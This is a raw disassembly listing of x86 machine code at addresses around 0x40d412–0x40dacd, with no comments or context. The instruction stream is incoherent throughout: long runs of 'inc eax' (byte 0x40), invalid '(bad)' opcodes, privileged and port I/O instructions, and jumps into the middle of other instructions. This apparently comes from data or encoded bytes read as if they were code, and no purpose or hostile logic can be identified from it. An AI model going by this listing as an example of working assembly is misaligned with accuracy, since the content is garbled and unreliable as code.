  40d412:	inc    eax
  40d413:	inc    DWORD PTR [eax-0x68]
  40d416:	gs mov eax,0x4232786b
  40d41c:	popf   
  40d41d:	push   esi
  40d41e:	pop    ss
  40d41f:	dec    esi
  40d420:	jno    0x40d448
  40d422:	pop    ss
  40d423:	jge    0x40d47b
  40d425:	hlt    
  40d426:	push   eax
  40d427:	test   eax,0x40404040
  40d42c:	inc    eax
  40d42d:	inc    eax
  40d42e:	inc    eax
  40d42f:	inc    eax
  40d430:	inc    eax
  40d431:	inc    eax
  40d432:	xor    bh,BYTE PTR [esi+0x15a89c24]
  40d438:	bound  ebp,QWORD PTR [esp+edx*4+0x49]
  40d43c:	ss gs inc eax
  40d43f:	dec    ecx
  40d440:	jbe    0x40d479
  40d442:	shl    cl,0x48
  40d445:	addr16 mov dl,0x66
  40d448:	pop    eax
  40d449:	pop    ebp
  40d44a:	repz inc eax
  40d44c:	inc    eax
  40d44d:	inc    eax
  40d44e:	inc    eax
  40d44f:	inc    eax
  40d450:	inc    eax
  40d451:	inc    eax
  40d452:	inc    eax
  40d453:	add    BYTE PTR [ebx],dl
  40d455:	and    ah,BYTE PTR [eax*1+0x62636740]
  40d45c:	push   eax
  40d45d:	xor    BYTE PTR [edx-0x7a],dl
  40d460:	inc    eax
  40d461:	inc    edx
  40d462:	inc    eax
  40d463:	or     al,0x40
  40d465:	inc    eax
  40d466:	inc    eax
  40d467:	inc    eax
  40d468:	inc    eax
  40d469:	inc    eax
  40d46a:	and    eax,0x6d404040
  40d46f:	inc    ebp
  40d470:	aad    0x69
  40d472:	inc    edx
  40d473:	jecxz  0x40d475
  40d475:	xchg   ebx,eax
  40d476:	pop    esi
  40d477:	gs jae 0x40d42b
  40d47a:	iret   
  40d47b:	lods   eax,DWORD PTR ds:[esi]
  40d47c:	sub    eax,0x5e11c31
  40d482:	inc    eax
  40d483:	inc    eax
  40d484:	inc    eax
  40d485:	inc    eax
  40d486:	inc    eax
  40d487:	inc    eax
  40d488:	inc    eax
  40d489:	inc    eax
  40d48a:	inc    eax
  40d48b:	inc    eax
  40d48c:	test   eax,0x2a226262
  40d491:	gs push ebp
  40d493:	xchg   BYTE PTR [eax+0x53680541],dh
  40d499:	dec    ebp
  40d49a:	addr16 jb 0x40d4e0
  40d49d:	jg     0x40d426
  40d49f:	int3   
  40d4a0:	fisub  DWORD PTR [ebx+0x4d71b024]
  40d4a6:	inc    edi
  40d4a7:	sti    
  40d4a8:	rcl    DWORD PTR [edi],1
  40d4aa:	inc    eax
  40d4ab:	inc    eax
  40d4ac:	inc    eax
  40d4ad:	inc    eax
  40d4ae:	inc    eax
  40d4af:	inc    eax
  40d4b0:	rol    DWORD PTR [eax+0x40],0x52
  40d4b4:	add    eax,0x7f346288
  40d4b9:	cmp    DWORD PTR [esi],ecx
  40d4bb:	ins    DWORD PTR es:[edi],dx
  40d4bc:	xchg   BYTE PTR [esp+eax*2-0x80],ah
  40d4c0:	mov    bh,0x55
  40d4c2:	sub    BYTE PTR es:[esi+0x35],0xe7
  40d4c7:	(bad)
  40d4ca:	xor    al,0x56
  40d4cc:	scas   eax,DWORD PTR es:[edi]
  40d4cd:	sbb    BYTE PTR [ecx+0x405f114c],al
  40d4d3:	inc    eax
  40d4d4:	add    BYTE PTR [eax+0x40],al
  40d4d7:	inc    eax
  40d4d8:	inc    eax
  40d4d9:	inc    eax
  40d4da:	inc    eax
  40d4db:	inc    esp
  40d4dc:	addr16 add eax,0xe6446362
  40d4e2:	lahf   
  40d4e3:	and    DWORD PTR [esi+eax*4],esp
  40d4e6:	inc    eax
  40d4e7:	out    0x4c,al
  40d4e9:	bound  eax,QWORD PTR [edx+edi*2]
  40d4ec:	push   edx
  40d4ed:	jne    0x40d543
  40d4ef:	test   al,0x3c
  40d4f1:	push   ebx
  40d4f2:	pop    edi
  40d4f3:	arpl   bp,ax
  40d4f5:	scas   al,BYTE PTR es:[edi]
  40d4f6:	inc    eax
  40d4f7:	inc    eax
  40d4f8:	inc    eax
  40d4f9:	inc    eax
  40d4fa:	inc    eax
  40d4fb:	inc    eax
  40d4fc:	inc    eax
  40d4fd:	inc    eax
  40d4fe:	inc    eax
  40d4ff:	inc    eax
  40d500:	fmul   QWORD PTR [esp+ebp*2-0x36]
  40d504:	jp     0x40d54f
  40d506:	pop    ecx
  40d507:	add    eax,0xf9f32a42
  40d50c:	lahf   
  40d50d:	out    0x65,eax
  40d50f:	xchg   BYTE PTR [ebp+0x4f],cl
  40d512:	test   al,0x5a
  40d514:	add    al,0x47
  40d516:	push   esp
  40d517:	inc    eax
  40d518:	inc    eax
  40d519:	inc    eax
  40d51a:	inc    eax
  40d51b:	inc    eax
  40d51c:	inc    eax
  40d51d:	int3   
  40d51e:	jne    0x40d560
  40d520:	pusha  
  40d521:	push   eax
  40d522:	xor    eax,0x205f1f10
  40d527:	clc    
  40d528:	lods   eax,DWORD PTR ds:[esi]
  40d529:	or     al,0x40
  40d52b:	dec    esp
  40d52c:	cmp    BYTE PTR [edx+0x60],bh
  40d52f:	addr16 add eax,0x5d05784f
  40d535:	pop    ds
  40d536:	push   esi
  40d537:	and    eax,0xcbc3dd86
  40d53c:	mov    al,0xd5
  40d53e:	and    eax,0x484c1452
  40d543:	inc    eax
  40d544:	add    cl,al
  40d546:	inc    eax
  40d547:	inc    eax
  40d548:	inc    eax
  40d549:	inc    eax
  40d54a:	add    BYTE PTR [eax+0x44],al
  40d54d:	popa   
  40d54e:	std    
  40d54f:	std    
  40d550:	aad    0xac
  40d552:	pusha  
  40d553:	add    eax,0x116bf70c
  40d558:	add    BYTE PTR ds:0x984ccb74,0x53
  40d55f:	and    edi,ecx
  40d561:	xchg   BYTE PTR [eax-0x2edf9db7],dl
  40d567:	dec    edx
  40d568:	arpl   WORD PTR [esi],cx
  40d56a:	stos   DWORD PTR es:[edi],eax
  40d56b:	cmp    ebp,DWORD PTR [edx]
  40d56d:	push   esi
  40d56e:	shl    ebx,1
  40d570:	sbb    al,0x40
  40d572:	inc    eax
  40d573:	inc    eax
  40d574:	inc    eax
  40d575:	inc    eax
  40d576:	inc    eax
  40d577:	inc    eax
  40d578:	inc    eax
  40d579:	inc    DWORD PTR [eax-0x55]
  40d57c:	cld    
  40d57d:	pushf  
  40d57e:	mov    al,0x49
  40d580:	and    al,bl
  40d582:	push   edx
  40d583:	add    eax,0xb56263b2
  40d588:	jno    0x40d5eb
  40d58a:	push   edx
  40d58b:	xchg   BYTE PTR [edx-0x48],ah
  40d58e:	sub    bl,al
  40d590:	mov    edi,0xd8605b54
  40d595:	add    eax,0xa1f36e6c
  40d59a:	inc    eax
  40d59b:	inc    eax
  40d59c:	inc    eax
  40d59d:	inc    eax
  40d59e:	inc    eax
  40d59f:	inc    eax
  40d5a0:	inc    eax
  40d5a1:	inc    eax
  40d5a2:	inc    eax
  40d5a3:	inc    eax
  40d5a4:	stc    
  40d5a5:	stos   BYTE PTR es:[edi],al
  40d5a6:	pop    eax
  40d5a7:	retf   
  40d5a8:	xor    al,0xf4
  40d5aa:	mov    bl,0x50
  40d5ac:	push   edx
  40d5ad:	add    eax,0x1804864
  40d5b2:	push   0x21
  40d5b4:	dec    esi
  40d5b5:	xchg   BYTE PTR [eax-0xaf83abf],dl
  40d5bb:	xor    al,0x30
  40d5bd:	inc    eax
  40d5be:	inc    eax
  40d5bf:	inc    eax
  40d5c0:	inc    eax
  40d5c1:	inc    eax
  40d5c2:	inc    eax
  40d5c3:	inc    eax
  40d5c4:	inc    eax
  40d5c5:	add    BYTE PTR [ebx],dh
  40d5c7:	(bad)  
  40d5c8:	cs inc edx
  40d5ca:	sub    ecx,DWORD PTR [edx+0x3f]
  40d5cd:	push   eax
  40d5ce:	test   eax,0xa705bc4f
  40d5d3:	mov    cl,0xa
  40d5d5:	arpl   WORD PTR ds:0xd6c86b26,ax
  40d5db:	push   0xffffffa1
  40d5dd:	inc    eax
  40d5de:	inc    eax
  40d5df:	inc    eax
  40d5e0:	inc    eax
  40d5e1:	inc    eax
  40d5e2:	inc    eax
  40d5e3:	and    eax,0xb9404040
  40d5e8:	xchg   BYTE PTR [eax+0x2d],dh
  40d5eb:	mov    esi,0x562af548
  40d5f0:	aaa    
  40d5f1:	cmp    ah,0x9c
  40d5f4:	push   esi
  40d5f5:	pop    edx
  40d5f6:	loope  0x40d65f
  40d5f8:	test   al,0xc3
  40d5fa:	fs test al,0x5c
  40d5fd:	jae    0x40d5be
  40d5ff:	xor    BYTE PTR ds:0x4e117644,al
  40d605:	add    eax,DWORD PTR [eax+0x40]
  40d608:	inc    eax
  40d609:	inc    eax
  40d60a:	inc    eax
  40d60b:	inc    eax
  40d60c:	inc    eax
  40d60d:	inc    eax
  40d60e:	inc    eax
  40d60f:	inc    eax
  40d610:	fs push edx
  40d612:	xchg   BYTE PTR [eax-0x48],cl
  40d615:	dec    eax
  40d616:	xchg   esp,eax
  40d617:	xor    esp,ebx
  40d619:	aad    0x2f
  40d61b:	loopne 0x40d67f
  40d61d:	or     eax,0x354353a2
  40d622:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d623:	sbb    al,0xa4
  40d625:	retf   
  40d626:	add    dh,BYTE PTR [ecx+0x4f0595e1]
  40d62c:	inc    eax
  40d62d:	inc    eax
  40d62e:	inc    eax
  40d62f:	inc    eax
  40d630:	inc    eax
  40d631:	inc    eax
  40d632:	rol    DWORD PTR [eax+0x40],0x28
  40d636:	inc    esp
  40d637:	dec    ebx
  40d638:	gs pop eax
  40d63a:	gs xchg ch,bl
  40d63d:	data16 aas 
  40d63f:	adc    esi,ebp
  40d641:	and    esp,DWORD PTR [edi+0x24]
  40d644:	pop    edi
  40d645:	in     al,dx
  40d646:	lds    edi,FWORD PTR fs:[edi+0x4ea63074]
  40d64d:	pusha  
  40d64e:	bound  ecx,QWORD PTR [edx+0x40004040]
  40d654:	inc    eax
  40d655:	inc    eax
  40d656:	inc    eax
  40d657:	inc    eax
  40d658:	inc    eax
  40d659:	shl    DWORD PTR [edx+0x52],cl
  40d65c:	add    eax,0xa3406d7d
  40d661:	pop    ds
  40d662:	sub    DWORD PTR [ebp-0x7a],ecx
  40d665:	ins    BYTE PTR es:[edi],dx
  40d666:	bound  ebp,QWORD PTR [edx]
  40d668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d669:	pop    esi
  40d66a:	push   ebx
  40d66b:	loopne 0x40d69b
  40d66d:	rdmsr  
  40d66f:	pop    edx
  40d670:	vpunpcklwd ymm4,ymm1,YMMWORD PTR ds:0x864c28a5
  40d678:	fistp  DWORD PTR [ebp+0x7c]
  40d67b:	inc    eax
  40d67c:	inc    eax
  40d67d:	inc    eax
  40d67e:	inc    eax
  40d67f:	inc    eax
  40d680:	inc    eax
  40d681:	inc    eax
  40d682:	inc    eax
  40d683:	inc    eax
  40d684:	inc    eax
  40d685:	stc    
  40d686:	add    eax,0x400ce700
  40d68b:	aaa    
  40d68c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d68d:	xchg   BYTE PTR [bx+si],dh
  40d690:	es stos DWORD PTR es:[edi],eax
  40d692:	pusha  
  40d693:	push   ebx
  40d694:	sub    eax,0x53662932
  40d699:	mov    eax,0x52b6d540
  40d69e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d69f:	inc    ecx
  40d6a0:	dec    edx
  40d6a1:	add    eax,0x40404040
  40d6a6:	inc    eax
  40d6a7:	inc    eax
  40d6a8:	int3   
  40d6a9:	jne    0x40d6eb
  40d6ab:	inc    eax
  40d6ac:	push   ebx
  40d6ad:	pop    ecx
  40d6ae:	lds    eax,FWORD PTR ds:0x40cb34bc
  40d6b4:	fild   QWORD PTR [ebx]
  40d6b6:	sti    
  40d6b7:	xchg   BYTE PTR [eax+eax*2+0x45],ch
  40d6bb:	push   eax
  40d6bc:	push   ebx
  40d6bd:	jnp    0x40d65c
  40d6bf:	pop    ss
  40d6c0:	sti    
  40d6c1:	dec    esp
  40d6c2:	inc    ebx
  40d6c3:	inc    eax
  40d6c4:	fbld   TBYTE PTR [ecx+0x41a8a3c0]
  40d6ca:	inc    ebx
  40d6cb:	inc    eax
  40d6cc:	push   edx
  40d6cd:	pop    edx
  40d6ce:	xchg   esp,eax
  40d6cf:	inc    eax
  40d6d0:	add    cl,al
  40d6d2:	inc    eax
  40d6d3:	inc    eax
  40d6d4:	inc    eax
  40d6d5:	inc    eax
  40d6d6:	add    BYTE PTR [eax+0x5],al
  40d6d9:	adc    bl,BYTE PTR [eax]
  40d6db:	cld    
  40d6dc:	inc    eax
  40d6dd:	icebp  
  40d6de:	loope  0x40d732
  40d6e0:	xchg   BYTE PTR [ebp+0x54],dl
  40d6e3:	imul   edx,DWORD PTR [eax+0x4f],0x40404040
  40d6ea:	inc    eax
  40d6eb:	inc    eax
  40d6ec:	inc    eax
  40d6ed:	inc    eax
  40d6ee:	inc    DWORD PTR [eax+0x76]
  40d6f1:	aad    0x60
  40d6f3:	inc    ecx
  40d6f4:	arpl   WORD PTR [edx+0x40],bx
  40d6f7:	jae    0x40d760
  40d6f9:	hlt    
  40d6fa:	mov    ds:0x40d0b44f,al
  40d6ff:	mov    edi,0xbc059950
  40d704:	or     eax,0xe5114005
  40d709:	xchg   BYTE PTR [bx+0x43],al
  40d70d:	xchg   DWORD PTR [eax],edx
  40d70f:	xchg   ebx,eax
  40d710:	push   ebx
  40d711:	xor    BYTE PTR [ebx-0x8],bh
  40d714:	mov    esp,0x40404048
  40d719:	inc    eax
  40d71a:	inc    eax
  40d71b:	inc    eax
  40d71c:	inc    eax
  40d71d:	inc    eax
  40d71e:	inc    eax
  40d71f:	inc    eax
  40d720:	inc    eax
  40d721:	push   0xffffffa1
  40d723:	push   edx
  40d724:	mov    eax,ds:0x405d0ddd
  40d729:	push   ecx
  40d72a:	and    eax,0xcb4105cd
  40d72f:	fild   WORD PTR [eax+0x42]
  40d732:	mov    al,ds:0x40bd861c
  40d737:	inc    eax
  40d738:	inc    eax
  40d739:	inc    eax
  40d73a:	inc    eax
  40d73b:	inc    eax
  40d73c:	inc    eax
  40d73d:	inc    eax
  40d73e:	add    BYTE PTR [ebx-0x74],bl
  40d741:	adc    BYTE PTR [ecx],dl
  40d743:	es sbb eax,0x8cab6d70
  40d749:	inc    eax
  40d74a:	jo     0x40d70a
  40d74c:	mov    al,fs:0x40394546
  40d752:	jp     0x40d78b
  40d754:	stc    
  40d755:	add    eax,0x41764644
  40d75a:	arpl   WORD PTR cs:[esi+eax*4+0x6e],sp
  40d75f:	cwde   
  40d760:	rcl    BYTE PTR gs:[ebx+0x42],1
  40d764:	loope  0x40d7d4
  40d766:	inc    eax
  40d767:	inc    eax
  40d768:	inc    eax
  40d769:	inc    eax
  40d76a:	inc    eax
  40d76b:	inc    eax
  40d76c:	and    eax,0xb8404040
  40d771:	dec    ecx
  40d772:	mov    ah,0x40
  40d774:	cmp    edx,esp
  40d776:	push   edx
  40d777:	lahf   
  40d778:	xor    al,0x34
  40d77a:	inc    ecx
  40d77b:	inc    eax
  40d77c:	adc    bh,BYTE PTR [edx]
  40d77e:	lds    eax,FWORD PTR ds:0x40ad40d9
  40d784:	aas    
  40d785:	sbb    BYTE PTR [ecx-0x7a],bh
  40d788:	bound  eax,QWORD PTR [eax-0x21]
  40d78b:	inc    eax
  40d78c:	inc    eax
  40d78d:	inc    eax
  40d78e:	inc    eax
  40d78f:	inc    eax
  40d790:	inc    eax
  40d791:	inc    eax
  40d792:	inc    eax
  40d793:	inc    eax
  40d794:	inc    eax
  40d795:	inc    eax
  40d796:	sbb    BYTE PTR [edx-0x27],ah
  40d799:	ja     0x40d721
  40d79b:	push   eax
  40d79c:	push   ebp
  40d79d:	inc    eax
  40d79e:	mov    bl,0x13
  40d7a0:	fs sahf 
  40d7a2:	mov    ah,0x40
  40d7a4:	cmp    eax,0x4040b7d1
  40d7a9:	inc    eax
  40d7aa:	inc    eax
  40d7ab:	inc    eax
  40d7ac:	inc    eax
  40d7ad:	rol    DWORD PTR [eax+0x40],0x9
  40d7b1:	dec    eax
  40d7b2:	add    eax,0x40436521
  40d7b7:	aas    
  40d7b8:	and    al,0x30
  40d7ba:	xchg   dl,bl
  40d7bc:	mov    al,0xe4
  40d7be:	inc    eax
  40d7bf:	lahf   
  40d7c0:	xor    al,0x42
  40d7c2:	pusha  
  40d7c3:	xchg   esi,eax
  40d7c4:	add    eax,0x1d60400e
  40d7c9:	aad    0x9d
  40d7cb:	stos   DWORD PTR es:[edi],eax
  40d7cc:	inc    esi
  40d7cd:	jmp    0x40d80f
  40d7cf:	inc    eax
  40d7d0:	add    BYTE PTR [eax+0x40],al
  40d7d3:	inc    eax
  40d7d4:	inc    eax
  40d7d5:	inc    eax
  40d7d6:	inc    eax
  40d7d7:	aas    
  40d7d8:	mov    cl,0x63
  40d7da:	jo     0x40d7e1
  40d7dc:	inc    edx
  40d7dd:	fsubr  QWORD PTR [eax+0x56954c40]
  40d7e3:	xchg   al,cl
  40d7e5:	adc    al,BYTE PTR fs:[eax+0x40]
  40d7e9:	inc    eax
  40d7ea:	inc    eax
  40d7eb:	inc    eax
  40d7ec:	inc    eax
  40d7ed:	inc    eax
  40d7ee:	inc    eax
  40d7ef:	inc    eax
  40d7f0:	inc    eax
  40d7f1:	inc    eax
  40d7f2:	push   esp
  40d7f3:	pop    ebx
  40d7f4:	push   esp
  40d7f5:	add    eax,0x40416241
  40d7fa:	or     al,0xa3
  40d7fc:	push   esi
  40d7fd:	pushf  
  40d7fe:	push   ebp
  40d7ff:	inc    eax
  40d800:	inc    eax
  40d801:	inc    eax
  40d802:	inc    eax
  40d803:	inc    eax
  40d804:	inc    eax
  40d805:	int3   
  40d806:	jne    0x40d848
  40d808:	xor    DWORD PTR [esp+edi*1+0x40],eax
  40d80c:	jl     0x313d3417
  40d812:	inc    eax
  40d813:	push   ebp
  40d814:	and    BYTE PTR [ebx-0x7a],dl
  40d817:	push   esp
  40d818:	push   esp
  40d819:	stos   DWORD PTR es:[edi],eax
  40d81a:	inc    eax
  40d81b:	push   ecx
  40d81c:	pusha  
  40d81d:	int    0x9
  40d81f:	jo     0x40d7f2
  40d821:	pop    edx
  40d822:	inc    eax
  40d823:	aas    
  40d824:	pop    edx
  40d825:	and    BYTE PTR [ebx+0x2ec9a880],bl
  40d82b:	ret    
  40d82c:	inc    eax
  40d82d:	add    cl,al
  40d82f:	inc    eax
  40d830:	inc    eax
  40d831:	inc    eax
  40d832:	inc    eax
  40d833:	add    BYTE PTR [eax-0x55],al
  40d836:	jne    0x40d83d
  40d838:	ret    
  40d839:	adc    al,BYTE PTR ds:0x64469a40
  40d83f:	xchg   BYTE PTR [eax-0x16],cl
  40d842:	xchg   DWORD PTR [eax+0x34],eax
  40d845:	jecxz  0x40d840
  40d847:	adc    eax,DWORD PTR [ecx-0x11]
  40d84a:	inc    ecx
  40d84b:	inc    eax
  40d84c:	scas   al,BYTE PTR es:[edi]
  40d84d:	or     BYTE PTR [edx-0x66],ah
  40d850:	imul   esp,DWORD PTR [edx-0x37],0x4
  40d854:	push   esi
  40d855:	inc    eax
  40d856:	inc    eax
  40d857:	inc    eax
  40d858:	inc    eax
  40d859:	inc    eax
  40d85a:	inc    eax
  40d85b:	inc    eax
  40d85c:	inc    eax
  40d85d:	inc    DWORD PTR [eax+0x2b]
  40d860:	pop    ecx
  40d861:	add    eax,0x4050154c
  40d866:	xchg   edx,eax
  40d867:	adc    DWORD PTR [edx-0x7a],edx
  40d86a:	arpl   bx,cx
  40d86c:	or     eax,0x35e33240
  40d871:	or     eax,0x4040119c
  40d876:	inc    eax
  40d877:	inc    eax
  40d878:	inc    eax
  40d879:	inc    eax
  40d87a:	inc    eax
  40d87b:	inc    eax
  40d87c:	inc    eax
  40d87d:	inc    eax
  40d87e:	retf   
  40d87f:	inc    eax
  40d880:	enter  0x202d,0x99
  40d884:	push   eax
  40d885:	cwde   
  40d886:	inc    esp
  40d887:	inc    eax
  40d888:	xor    al,0x61
  40d88a:	push   edx
  40d88b:	add    eax,0xd7450dd5
  40d890:	inc    eax
  40d891:	inc    eax
  40d892:	inc    eax
  40d893:	inc    eax
  40d894:	inc    eax
  40d895:	inc    eax
  40d896:	inc    eax
  40d897:	inc    eax
  40d898:	add    BYTE PTR [ecx],cl
  40d89a:	lahf   
  40d89b:	push   0xffffff86
  40d89d:	pop    ecx
  40d89e:	int    0x49
  40d8a0:	mov    ds:0x60987040,al
  40d8a5:	dec    esp
  40d8a6:	add    al,0x20
  40d8a8:	out    0x60,eax
  40d8aa:	and    DWORD PTR [edx-0x68],edx
  40d8ad:	jge    0x40d8ef
  40d8af:	inc    eax
  40d8b0:	inc    eax
  40d8b1:	inc    eax
  40d8b2:	inc    eax
  40d8b3:	inc    eax
  40d8b4:	and    eax,0x34404040
  40d8b9:	aad    0x35
  40d8bb:	jno    0x40d8f6
  40d8bd:	jb     0x40d8c4
  40d8bf:	ja     0x40d901
  40d8c1:	push   ebp
  40d8c2:	sub    eax,0x8644a4f2
  40d8c7:	jl     0x40d909
  40d8c9:	xor    al,0x8e
  40d8cb:	and    eax,0x347bad28
  40d8d0:	inc    eax
  40d8d1:	adc    al,BYTE PTR [eax+0x40]
  40d8d4:	inc    eax
  40d8d5:	inc    eax
  40d8d6:	inc    eax
  40d8d7:	inc    eax
  40d8d8:	inc    eax
  40d8d9:	inc    eax
  40d8da:	inc    eax
  40d8db:	inc    eax
  40d8dc:	and    edx,0x47976258
  40d8e2:	and    BYTE PTR [ebx+0x77],0x49
  40d8e6:	mov    ds:0x7dba0564,eax
  40d8eb:	push   ecx
  40d8ec:	push   edx
  40d8ed:	xor    esp,DWORD PTR [ecx+0x52]
  40d8f0:	xchg   BYTE PTR [edx+0x40],ch
  40d8f3:	xor    al,0xd4
  40d8f5:	cmp    al,BYTE PTR [ebx]
  40d8f7:	int    0x15
  40d8f9:	mov    DWORD PTR [eax+0x40],eax
  40d8fc:	fs mov ch,0x5a
  40d8ff:	lock xchg esi,eax
  40d901:	fwait
  40d902:	inc    eax
  40d903:	push   eax
  40d904:	inc    eax
  40d905:	inc    eax
  40d906:	inc    eax
  40d907:	inc    eax
  40d908:	inc    eax
  40d909:	inc    eax
  40d90a:	rol    DWORD PTR [eax+0x40],0x2a
  40d90e:	mov    BYTE PTR [ebp-0x4157fa37],0x3d
  40d915:	xchg   esi,eax
  40d916:	hlt    
  40d917:	in     eax,0x36
  40d919:	xchg   BYTE PTR [edx],dl
  40d91b:	gs ret 
  40d91d:	fldcw  WORD PTR [esi]
  40d91f:	adc    edi,ecx
  40d921:	pusha  
  40d922:	dec    ebx
  40d923:	sahf   
  40d924:	push   ecx
  40d925:	outs   dx,DWORD PTR ds:[esi]
  40d926:	dec    ecx
  40d927:	lock bound edx,QWORD PTR [ebp+0x40c90542]
  40d92e:	inc    eax
  40d92f:	add    BYTE PTR [eax+0x40],al
  40d932:	inc    eax
  40d933:	inc    eax
  40d934:	inc    eax
  40d935:	inc    eax
  40d936:	ret    
  40d937:	adc    cl,BYTE PTR [ecx-0x9eefa9a]
  40d93d:	mov    esp,0x529f392b
  40d942:	xchg   BYTE PTR [edi+ecx*2+0x40404040],bh
  40d949:	inc    eax
  40d94a:	inc    eax
  40d94b:	inc    eax
  40d94c:	inc    eax
  40d94d:	inc    eax
  40d94e:	inc    eax
  40d94f:	adc    eax,0xc512053f
  40d954:	jnp    0x40d99b
  40d956:	inc    esp
  40d957:	retf   
  40d958:	imul   esi,DWORD PTR [ecx],0xf894f105
  40d95e:	inc    eax
  40d95f:	dec    esp
  40d960:	push   0x5e15771
  40d965:	pop    ebp
  40d966:	jns    0x40d9b1
  40d968:	outs   dx,DWORD PTR ds:[esi]
  40d969:	aaa    
  40d96a:	add    DWORD PTR [esi+eax*4],ebx
  40d96d:	dec    esp
  40d96e:	inc    eax
  40d96f:	inc    eax
  40d970:	inc    eax
  40d971:	inc    eax
  40d972:	inc    eax
  40d973:	inc    eax
  40d974:	int3   
  40d975:	jne    0x40d9b7
  40d977:	in     al,0x40
  40d979:	loope  0x40d926
  40d97b:	or     ch,BYTE PTR [eax]
  40d97d:	xor    edi,DWORD PTR [ebp+0x65]
  40d980:	adc    cl,bl
  40d982:	or     eax,DWORD PTR [ecx]
  40d984:	bound  edx,QWORD PTR [ebx-0x3e944798]
  40d98a:	adc    esp,ebp
  40d98c:	ins    BYTE PTR es:[edi],dx
  40d98d:	add    eax,0x8744157f
  40d992:	inc    eax
  40d993:	add    cl,al
  40d995:	inc    eax
  40d996:	inc    eax
  40d997:	inc    eax
  40d998:	inc    eax
  40d999:	add    BYTE PTR [eax+0x44],al
  40d99c:	test   DWORD PTR [eax-0x7a],ebx
  40d99f:	fmul   st(1),st
  40d9a1:	sub    DWORD PTR [edx+0x373df4d1],ecx
  40d9a7:	inc    eax
  40d9a8:	dec    eax
  40d9a9:	add    eax,0x40867326
  40d9ae:	inc    eax
  40d9af:	inc    eax
  40d9b0:	inc    eax
  40d9b1:	inc    eax
  40d9b2:	inc    eax
  40d9b3:	inc    eax
  40d9b4:	inc    eax
  40d9b5:	inc    DWORD PTR [eax+0x56]
  40d9b8:	xchg   edx,eax
  40d9b9:	sub    al,0x41
  40d9bb:	fs fs push edx
  40d9be:	and    DWORD PTR [edx+0x5],esp
  40d9c1:	jg     0x40d9ea
  40d9c3:	mov    eax,0x644e2dae
  40d9c8:	xchg   BYTE PTR [eax+eiz*2],ch
  40d9cb:	or     eax,0x520145a4
  40d9d0:	das    
  40d9d1:	mov    eax,ds:0xb0facb62
  40d9d6:	inc    edx
  40d9d7:	int    0x40
  40d9d9:	inc    eax
  40d9da:	inc    eax
  40d9db:	inc    eax
  40d9dc:	inc    eax
  40d9dd:	inc    eax
  40d9de:	inc    eax
  40d9df:	inc    eax
  40d9e0:	inc    eax
  40d9e1:	inc    eax
  40d9e2:	xchg   ecx,eax
  40d9e3:	loopne 0x40da51
  40d9e5:	nop
  40d9e6:	lods   al,BYTE PTR ds:[esi]
  40d9e7:	test   BYTE PTR cs:[ecx+0x5],dh
  40d9eb:	push   ebp
  40d9ec:	pop    ds
  40d9ed:	mov    edi,0xc1bb7f2d
  40d9f2:	xchg   bl,cl
  40d9f4:	std    
  40d9f5:	inc    edx
  40d9f6:	sbb    ebx,edx
  40d9f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9f9:	push   ebp
  40d9fa:	and    al,0x84
  40d9fc:	bound  edx,QWORD PTR ds:0x62a54664
  40da02:	nop
  40da03:	stos   DWORD PTR es:[edi],eax
  40da04:	loope  0x40d996
  40da06:	pop    es
  40da07:	adc    DWORD PTR [eax+0x40],eax
  40da0a:	inc    eax
  40da0b:	inc    eax
  40da0c:	inc    eax
  40da0d:	inc    eax
  40da0e:	inc    eax
  40da0f:	inc    eax
  40da10:	add    BYTE PTR [ebp+0x43010564],al
  40da16:	bound  esp,QWORD PTR [ebx-0x79adc355]
  40da1c:	je     0x40d9c6
  40da1e:	rcl    bh,0x46
  40da21:	add    ch,0x2e
  40da24:	leave  
  40da25:	adc    bl,cl
  40da27:	loope  0x40d9fe
  40da29:	sub    al,0x19
  40da2b:	(bad)  
  40da2c:	es cwde 
  40da2e:	mov    edi,0xbd55d50a
  40da33:	add    eax,0x404042b8
  40da38:	inc    eax
  40da39:	inc    eax
  40da3a:	inc    eax
  40da3b:	inc    eax
  40da3c:	and    eax,0xbf404040
  40da41:	das    
  40da42:	push   ecx
  40da43:	add    dl,BYTE PTR [esi-0x7a]
  40da46:	or     eax,0x7693a279
  40da4b:	ss inc edx
  40da4d:	sub    DWORD PTR [esi-0x8],eax
  40da50:	pop    ecx
  40da51:	push   esp
  40da52:	adc    eax,0x428ed465
  40da57:	bound  eax,QWORD PTR [ebx+0x2e]
  40da5a:	inc    eax
  40da5b:	inc    eax
  40da5c:	inc    eax
  40da5d:	inc    eax
  40da5e:	inc    eax
  40da5f:	inc    eax
  40da60:	inc    eax
  40da61:	inc    eax
  40da62:	inc    eax
  40da63:	inc    eax
  40da64:	dec    ebx
  40da65:	or     eax,edx
  40da67:	add    eax,0x3275c94
  40da6c:	cmp    eax,0xc86424d
  40da71:	sub    ch,BYTE PTR [edi+eiz*8+0x31]
  40da75:	add    dh,BYTE PTR ds:0x64364417
  40da7b:	dec    esp
  40da7c:	jne    0x40daa9
  40da7e:	dec    ebx
  40da7f:	lea    edx,[ecx-0x55]
  40da82:	inc    eax
  40da83:	inc    eax
  40da84:	inc    eax
  40da85:	inc    eax
  40da86:	inc    eax
  40da87:	inc    eax
  40da88:	rol    DWORD PTR [eax+0x40],0x1
  40da8c:	sub    al,0xa
  40da8e:	aaa    
  40da8f:	test   al,0x5
  40da91:	imul   eax,DWORD PTR [eax+0x5477f130],0x73868611
  40da9b:	inc    eax
  40da9c:	test   DWORD PTR [eax],esi
  40da9e:	add    DWORD PTR [eax+ebp*2],ebx
  40daa1:	ret    
  40daa2:	inc    esp
  40daa3:	sub    BYTE PTR [ecx+ebx*4+0x76],cl
  40daa7:	inc    ebx
  40daa8:	mov    WORD PTR [eax+0x5621335],?
  40daae:	inc    eax
  40daaf:	inc    eax
  40dab0:	add    BYTE PTR [eax+0x40],al
  40dab3:	inc    eax
  40dab4:	inc    eax
  40dab5:	inc    eax
  40dab6:	inc    eax
  40dab7:	add    DWORD PTR [edx+0x5],esp
  40daba:	retf   
  40dabb:	inc    ebp
  40dabc:	xor    al,0xa4
  40dabe:	jno    0x40db08
  40dac0:	int    0x86
  40dac2:	inc    ecx
  40dac3:	jo     0x40da45
  40dac5:	or     eax,0x60cd81bf
  40daca:	inc    ebp
  40dacb:	cmp    al,0xc5
  40dacd:	bound  ebp,QWORD PTR [edi+edx*2+0x40]
